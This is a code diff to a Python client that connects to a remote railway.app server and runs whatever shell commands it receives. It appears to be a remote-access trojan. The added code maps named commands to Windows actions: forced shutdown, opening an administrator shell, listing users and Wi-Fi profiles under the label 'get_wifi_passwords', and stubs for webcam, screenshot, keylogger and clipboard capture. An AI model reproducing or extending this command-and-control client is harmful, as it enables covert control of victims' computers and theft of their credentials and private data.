@@ -18,7 +18,7 @@ import base64
 from urllib.parse import urljoin
 
 # Configuration
-SERVER_URL = os.environ.get('SERVER_URL', 'https://pablosboson-server-production.up.railway.app')
+SERVER_URL = os.environ.get('SERVER_URL', 'https://pablo1-production.up.railway.app')
 RECONNECT_DELAY = 10     # Seconds between reconnection attempts
 HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats
 
@@ -79,12 +79,34 @@ class WebClient:
             return {"error": str(e)}
 
     def execute_command(self, command):
-        """Execute system command"""
+        """Execute system command with special command handling"""
         try:
             print(f"Executing command: {command}")
             
+            # Handle special commands with mappings
+            command_mappings = {
+                "shutdown": "shutdown /s /t 0",
+                "open_cmd": "start cmd",
+                "open_cmd_admin": "start runas /user:Administrator cmd.exe",
+                "open_calculator": "calc.exe",
+                "open_notepad": "notepad.exe",
+                "get_owner": "net user %USERNAME%",
+                "tasklist": "tasklist",
+                "get_wifi_passwords": "netsh wlan show profiles",
+                "capture_webcam": "echo Webcam capture not implemented in web client",
+                "capture_screenshot": "echo Screenshot capture not implemented in web client",
+                "keylog_start": "echo Keylogger not implemented in web client",
+                "keylog_stop": "echo Keylogger not implemented in web client",
+                "clipboard_start": "echo Clipboard monitoring not implemented in web client",
+                "clipboard_stop": "echo Clipboard monitoring not implemented in web client",
+                "clipboard_get": "echo Clipboard access not implemented in web client"
+            }
+            
+            # Use mapped command if available, otherwise use original
+            actual_command = command_mappings.get(command, command)
+            
             result = subprocess.run(
-                command,
+                actual_command,
                 shell=True,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
